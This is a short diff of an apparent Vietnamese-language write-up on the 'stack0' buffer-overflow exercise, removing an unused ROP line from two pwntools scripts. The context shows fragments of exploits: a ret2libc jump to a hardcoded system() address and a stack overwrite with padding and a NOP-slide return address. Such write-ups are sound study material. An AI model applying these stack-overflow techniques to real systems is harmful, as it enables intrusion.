@@ -38,7 +38,6 @@ thay vì để jump về `0x08048419` ta có thể return về hàm system() đ�
 #!/usr/bin/python3
 from pwn import *
 elf = context.binary = ELF('./stack0')
-rop = ROP(elf)
 
 #system() address
 system_addr = 0xf7e11790
@@ -64,7 +63,6 @@ Check qua phân vùng stack, mình thấy nó có quyền excute. Nên mình s�
 #!/usr/bin/python3
 from pwn import *
 elf = context.binary = ELF('./stack0')
-rop = ROP(elf)
 
 padding = b'a'*80
 eip = p32(0xffffd250+100) # esp addr + offset nop_slide
